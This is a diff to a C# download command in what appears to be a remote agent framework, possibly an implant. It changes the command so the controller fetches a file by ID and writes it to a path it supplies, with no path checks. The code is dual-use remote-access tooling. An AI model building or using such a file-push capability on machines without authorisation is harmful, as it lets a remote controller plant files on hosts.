@@ -14,15 +14,9 @@ namespace Agent.Commands
 
         public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
         {
-            if (task.SplittedArgs.Length == 0)
-            {
-                result.Result = "Please specify the name of the file to download!";
-                return;
-            }
+            var fileName = task.FileName;
 
-            var fileName = task.SplittedArgs[0];
-
-            var fileContent = commm.Download(fileName, a =>
+            var fileContent = commm.Download(task.FileId, a =>
             {
                 result.Info = $"Downloading {fileName} ({a}%)";
                 commm.SendResult(result);
@@ -31,22 +25,12 @@ namespace Agent.Commands
 
             this.Notify(result, commm, $"{fileName} Downloaded");
 
-            string path = string.Empty;
-            if (task.SplittedArgs.Length > 1)
-            {
-                path = task.SplittedArgs[1];
-            }
-            else
-            {
-                path = Path.Combine(Environment.CurrentDirectory, Path.GetFileName(fileName));
-            }
-
-            using (FileStream fs = new FileStream(path, FileMode.Create, FileAccess.Write))
+            using (FileStream fs = new FileStream(fileName, FileMode.Create, FileAccess.Write))
             {
                 fs.Write(fileContent, 0, fileContent.Length);
             }
 
-            result.Result = $"File dowloaded to {path}.";
+            result.Result = $"File dowloaded to {fileName}.";
         }
     }
 }
